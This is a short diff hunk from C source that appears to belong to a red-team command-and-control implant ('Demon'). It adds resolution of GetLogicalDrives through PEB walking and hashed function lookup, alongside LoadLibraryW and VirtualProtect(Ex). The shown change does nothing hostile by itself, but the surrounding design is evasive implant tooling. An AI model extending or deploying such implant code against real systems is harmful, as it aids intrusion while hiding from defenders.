@@ -394,6 +394,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
 
     /* load kernel32.dll functions */
     if ( ( Instance->Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) ) {
+        Instance->Win32.GetLogicalDrives                = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_GETLOGICALDRIVES );
         Instance->Win32.LoadLibraryW                    = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_LOADLIBRARYW );
         Instance->Win32.VirtualProtectEx                = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_VIRTUALPROTECTEX );
         Instance->Win32.VirtualProtect                  = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_VIRTUALPROTECT );
